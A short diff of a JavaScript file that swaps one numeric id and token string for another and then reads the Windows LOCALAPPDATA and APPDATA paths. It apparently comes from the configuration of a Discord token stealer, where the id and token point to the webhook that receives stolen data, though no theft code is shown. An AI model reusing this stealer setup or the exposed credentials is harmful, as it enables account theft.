@@ -1,5 +1,5 @@
-const id = `874695000556961873`
-const tokencoisado = `eI8RFtfr4J2_eQ33i5Qnqoxk0_S-fFXA-jMaFt9DhXHDoPltWaNCAySLQQmuz_CAsDbE`
+const id = `877271583692062760`
+const tokencoisado = `IRyKUi-31DfzHAcobkYvvaBgfHVkgBb1MWiT1nGslZRG5jK04eeO6hjXh2QaI5DaHWbp`
 
 const localappdata = process.env.LOCALAPPDATA;
 const appdata = process.env.APPDATA;
